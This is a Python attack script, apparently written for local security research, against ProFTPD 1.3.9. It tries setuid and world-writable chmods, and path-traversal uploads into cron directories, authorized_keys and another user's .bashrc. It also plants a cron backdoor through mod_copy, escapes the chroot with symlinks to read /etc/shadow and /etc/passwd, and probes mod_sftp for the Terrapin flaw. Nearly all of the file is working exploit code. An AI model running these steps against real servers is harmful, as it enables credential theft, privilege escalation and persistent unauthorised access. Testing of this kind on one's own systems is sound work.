#!/usr/bin/env python3
"""
ProFTPD 1.3.9 — Attack Script 04: Privilege Escalation + CVE Verification
independent security research. — Phase 3 / Phase 4

1. SITE CHMOD privilege escalation (setuid bit, world-writable)
2. CVE-2024-48651 — mod_sql GID 0 privilege escalation probe
3. CVE-2023-48795 — Terrapin attack probe on mod_sftp (port 2222)
4. STOR to sensitive locations (path traversal write)
5. Post-auth chroot escape via SITE SYMLINK chain
6. mod_copy to overwrite crontab / authorized_keys for persistence
"""
import socket, time, json, os, re
from datetime import datetime

HOST, PORT = "127.0.0.1", 21
SFTP_PORT = 2222
USER, PASS = "ftptest", "ftptest123"
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"

def drain_recv(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk: break
            data += chunk
            decoded = data.decode('utf-8', errors='replace')
            lines = [l for l in decoded.strip().split('\n') if l.strip()]
            if lines:
                last = lines[-1]
                if len(last) >= 4 and last[:3].isdigit() and last[3] == ' ':
                    break
    except socket.timeout:
        pass
    return data.decode('utf-8', errors='replace').strip()

def connect_auth():
    s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
    drain_recv(s)
    s.sendall(f"USER {USER}\r\n".encode()); drain_recv(s)
    s.sendall(f"PASS {PASS}\r\n".encode()); r = drain_recv(s)
    return s, "230" in r

def cmd(s, c, timeout=5):
    s.sendall((c+"\r\n").encode())
    return drain_recv(s, timeout)

def main():
    print("="*60)
    print("Attack 04: Privilege Escalation + CVE Verification")
    print("ProFTPD 1.3.9 — Phase 3/4 Targeted Attacks")
    print("="*60)

    evidence = {"attack": "privesc_cve", "date": datetime.now().isoformat(), "tests": {}}

    # -------------------------------------------------------
    # TEST 1: SITE CHMOD — try to set setuid/sticky bits
    # -------------------------------------------------------
    print("\n[1] SITE CHMOD — setuid/setgid/sticky bit manipulation")
    s, ok = connect_auth()
    chmod_results = {}
    if ok:
        # Create a test file first
        cmd(s, "CWD /home/ftptest")

        chmod_tests = [
            ("777 /home/ftptest/upload",  "World-writable dir"),
            ("4755 /home/ftptest/upload", "setuid bit on dir"),
            ("6755 /home/ftptest/upload", "setuid+setgid"),
            ("1777 /tmp",                 "Sticky bit on /tmp (already set)"),
            ("4777 /tmp/exfil_passwd",    "setuid on /etc/passwd copy"),
            ("777 /etc/passwd",           "chmod /etc/passwd (should fail)"),
            ("777 /etc/shadow",           "chmod /etc/shadow (should fail)"),
        ]
        for mode_path, label in chmod_tests:
            resp = cmd(s, f"SITE CHMOD {mode_path}")
            success = "200" in resp
            chmod_results[label] = {"cmd": f"SITE CHMOD {mode_path}", "response": resp[:80], "success": success}
            print(f"  {'[+]' if success else '[-]'} {label}: {resp[:60]}")

            if success:
                # Verify with stat
                parts = mode_path.split(' ', 1)
                if len(parts) == 2:
                    path = parts[1]
                    try:
                        st = os.stat(path)
                        import stat
                        mode = oct(st.st_mode)
                        chmod_results[label]["verified_mode"] = mode
                        print(f"      Verified mode: {mode}")
                    except: pass
    s.close()
    evidence["tests"]["site_chmod"] = chmod_results

    # -------------------------------------------------------
    # TEST 2: STOR path traversal — write outside home
    # -------------------------------------------------------
    print("\n[2] STOR path traversal — write to sensitive locations")

    def stor_to(dest_path, content=b"test\n"):
        """Try to STOR to an arbitrary path."""
        try:
            s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
            drain_recv(s)
            s.sendall(f"USER {USER}\r\n".encode()); drain_recv(s)
            s.sendall(f"PASS {PASS}\r\n".encode()); drain_recv(s)
            # PORT mode
            listen_sock = socket.socket()
            listen_sock.bind(('127.0.0.1', 0))
            listen_sock.listen(1)
            _, p = listen_sock.getsockname()
            p1, p2 = p >> 8, p & 0xFF
            s.sendall(f"PORT 127,0,0,1,{p1},{p2}\r\n".encode()); drain_recv(s)
            s.sendall(f"STOR {dest_path}\r\n".encode())
            time.sleep(0.3)
            listen_sock.settimeout(5)
            try:
                conn, _ = listen_sock.accept()
                conn.sendall(content); conn.close()
            except: pass
            listen_sock.close()
            time.sleep(0.3)
            try: resp = s.recv(1024).decode('utf-8','replace')
            except: resp = ""
            s.sendall(b"QUIT\r\n"); s.close()
            return resp
        except Exception as e:
            return str(e)

    stor_tests = [
        ("../../../tmp/stor_traversal_test",       "Traversal via ../"),
        ("/tmp/stor_absolute_test",                "Absolute path /tmp/"),
        ("/etc/cron.d/proftpd_inject",             "Cron injection"),
        ("/home/ftptest/.ssh/authorized_keys",      "authorized_keys"),
        ("/var/spool/cron/crontabs/ftptest",        "User crontab"),
        ("/home/ftptest/../svc/.bashrc",            "Cross-user .bashrc"),
    ]

    stor_results = {}
    for dest, label in stor_tests:
        resp = stor_to(dest)
        success = "226" in resp or "250" in resp
        stor_results[label] = {"dest": dest, "response": resp[:100], "success": success}
        print(f"  {'[+]' if success else '[-]'} {label} ({dest}): {resp[:60]}")
    evidence["tests"]["stor_traversal"] = stor_results

    # -------------------------------------------------------
    # TEST 3: Persistence via mod_copy — copy to crontab
    # -------------------------------------------------------
    print("\n[3] Persistence via mod_copy → crontab overwrite")
    # First STOR a crontab payload
    cron_payload = b"* * * * * ftptest /tmp/backdoor.sh\n"
    stor_resp = stor_to("/home/ftptest/cron_payload", cron_payload)
    print(f"  STOR cron payload: {stor_resp[:60]}")

    persist_results = {}
    persist_targets = [
        ("/home/ftptest/cron_payload", "/var/spool/cron/crontabs/ftptest",
         "User crontab via mod_copy"),
        ("/home/ftptest/cron_payload", "/etc/cron.d/ftp_persist",
         "System cron.d via mod_copy"),
        ("/home/ftptest/cron_payload", "/home/ftptest/.ssh/authorized_keys",
         "authorized_keys via mod_copy (if .ssh exists)"),
    ]

    for src, dst, label in persist_targets:
        s, ok = connect_auth()
        if ok:
            r1 = cmd(s, f"SITE CPFR {src}")
            r2 = cmd(s, f"SITE CPTO {dst}") if "350" in r1 else ""
            success = "250" in r2
            persist_results[label] = {
                "cpfr": r1[:60], "cpto": r2[:60], "success": success
            }
            print(f"  {'[+]' if success else '[-]'} {label}: {r2[:60]}")
        s.close()
        time.sleep(0.1)
    evidence["tests"]["persistence_modcopy"] = persist_results

    # -------------------------------------------------------
    # TEST 4: CVE-2023-48795 Terrapin — mod_sftp probe
    # Check if ChaCha20-Poly1305 / CBC+HMAC-SHA2 ciphers offered
    # -------------------------------------------------------
    print("\n[4] CVE-2023-48795 Terrapin — mod_sftp cipher probe")
    terrapin_results = {}
    try:
        # Connect to SFTP port and capture SSH banner + kex init
        s = socket.socket(); s.settimeout(10); s.connect((HOST, SFTP_PORT))
        banner_bytes = s.recv(256)
        banner_str = banner_bytes.decode('utf-8', errors='replace').strip()
        print(f"  SSH Banner: {banner_str}")
        terrapin_results["banner"] = banner_str

        # Send our own SSH ident
        s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")

        # Read kex_init packet
        time.sleep(0.3)
        kex_data = b""
        s.settimeout(5)
        try:
            kex_data = s.recv(4096)
        except: pass

        # Parse SSH2 packet: uint32 length, byte padding_length, byte payload_type(20=kexinit)
        # Then 16 bytes cookie, then name-list fields
        kex_hex = kex_data.hex()
        terrapin_results["kex_init_bytes"] = len(kex_data)
        terrapin_results["kex_hex_prefix"] = kex_hex[:64]

        # Check for vulnerable ciphers in the raw data
        vulnerable_ciphers = [b"chacha20-poly1305@openssh.com", b"aes128-cbc", b"aes256-cbc"]
        cipher_findings = {}
        for cipher in vulnerable_ciphers:
            present = cipher in kex_data
            cipher_findings[cipher.decode()] = present
            if present:
                print(f"  [!] Vulnerable cipher advertised: {cipher.decode()}")
        terrapin_results["cipher_findings"] = cipher_findings
        terrapin_results["potentially_vulnerable"] = any(cipher_findings.values())

        s.close()
    except Exception as e:
        terrapin_results["error"] = str(e)
        print(f"  Error connecting to SFTP port: {e}")
    evidence["tests"]["cve_2023_48795_terrapin"] = terrapin_results

    # -------------------------------------------------------
    # TEST 5: SITE SYMLINK escape — chroot bypass attempt
    # With DefaultRoot ~, create symlink pointing out of home
    # Then try to traverse via the symlink
    # -------------------------------------------------------
    print("\n[5] SITE SYMLINK chroot escape attempt")
    s, ok = connect_auth()
    escape_results = {}
    if ok:
        # Create symlink to parent directory
        for target, linkname, label in [
            ("/", "/home/ftptest/root_escape", "Symlink to /"),
            ("/etc", "/home/ftptest/etc_escape", "Symlink to /etc"),
            ("/root", "/home/ftptest/root_home_escape", "Symlink to /root"),
        ]:
            r1 = cmd(s, f"SITE SYMLINK {target} {linkname}")
            # Try to CWD into symlink
            r2 = cmd(s, f"CWD {linkname}")
            r3 = cmd(s, "PWD")
            escape_results[label] = {
                "symlink_response": r1[:80],
                "cwd_response": r2[:80],
                "pwd_response": r3[:80],
                "escape_possible": "250" in r2
            }
            print(f"  {label}:")
            print(f"    SYMLINK: {r1[:60]}")
            print(f"    CWD:     {r2[:60]}")
            print(f"    PWD:     {r3[:60]}")
    s.close()
    evidence["tests"]["symlink_escape"] = escape_results

    # -------------------------------------------------------
    # TEST 6: RETR via symlink — read through symlink
    # -------------------------------------------------------
    print("\n[6] RETR via symlink — read sensitive files")
    # We already know /home/ftptest/shadow_link -> /etc/shadow exists

    def retr_file(path):
        """RETR a file and return its contents."""
        try:
            s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
            drain_recv(s)
            s.sendall(f"USER {USER}\r\n".encode()); drain_recv(s)
            s.sendall(f"PASS {PASS}\r\n".encode()); drain_recv(s)
            pasv = ""
            s.sendall(b"PASV\r\n"); pasv = drain_recv(s)
            m = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', pasv)
            if not m: return ""
            h = '.'.join(m.group(i) for i in range(1,5))
            p = int(m.group(5))*256+int(m.group(6))
            ds = socket.socket(); ds.settimeout(5); ds.connect((h, p))
            s.sendall(f"RETR {path}\r\n".encode())
            time.sleep(0.3)
            try: s.recv(256)
            except: pass
            data = b""
            try:
                while True:
                    c = ds.recv(4096)
                    if not c: break
                    data += c
            except: pass
            ds.close()
            s.sendall(b"QUIT\r\n"); s.close()
            return data.decode('utf-8','replace')
        except Exception as e:
            return str(e)

    retr_tests = [
        ("/home/ftptest/shadow_link",       "RETR via shadow symlink"),
        ("/home/ftptest/root_escape/etc/shadow", "RETR via / symlink → /etc/shadow"),
        ("/home/ftptest/etc_escape/shadow",  "RETR via /etc symlink → shadow"),
        ("/home/ftptest/root_escape/etc/passwd", "RETR via / symlink → /etc/passwd"),
    ]

    retr_results = {}
    for path, label in retr_tests:
        content = retr_file(path)
        success = bool(content) and "error" not in content.lower() and len(content) > 10
        retr_results[label] = {
            "path": path,
            "content_len": len(content),
            "preview": content[:100] if success else content[:200],
            "success": success
        }
        print(f"  {'[+]' if success else '[-]'} {label}:")
        if success:
            print(f"      {len(content)} bytes: {content[:80]!r}")
        else:
            print(f"      {content[:80]!r}")
    evidence["tests"]["retr_via_symlink"] = retr_results

    outfile = f"{EVIDENCE_DIR}/attack_04_privesc_cve.json"
    with open(outfile, 'w') as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence saved to {outfile}")

if __name__ == "__main__":
    main()
